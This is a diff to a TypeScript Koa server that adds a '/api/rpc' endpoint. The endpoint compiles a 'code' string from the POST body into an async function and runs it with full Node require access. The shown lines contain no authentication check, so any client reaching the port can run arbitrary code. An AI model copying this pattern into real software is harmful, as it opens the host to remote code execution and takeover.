@@ -279,6 +279,20 @@ const choose = async (ctx: any, next: any) => {
   }
 }
 
+const rpc = async (ctx: any, next: any) => {
+  if (ctx.path.startsWith('/api/rpc') && ctx.method === 'POST') {
+    const { code } = ctx.request.body
+    const AsyncFunction = Object.getPrototypeOf(async () => 0).constructor
+    const fn = new AsyncFunction('require', code)
+    const nodeRequire = (id: string) => id.startsWith('.')
+      ? require(path.resolve(__dirname, '..', id))
+      : require(id)
+    ctx.body = result('ok', 'success', await fn(nodeRequire))
+  } else {
+    await next()
+  }
+}
+
 const wrapper = async (ctx: any, next: any, fun: any) => {
   try {
     await fun(ctx, next)
@@ -316,6 +330,7 @@ const server = (port = 3000) => {
   app.use(async (ctx: any, next: any) => await wrapper(ctx, next, setting))
   app.use(async (ctx: any, next: any) => await wrapper(ctx, next, choose))
   app.use(async (ctx: any, next: any) => await wrapper(ctx, next, tmpFile))
+  app.use(async (ctx: any, next: any) => await wrapper(ctx, next, rpc))
 
   // static file
   app.use(async (ctx: any, next: any) => {
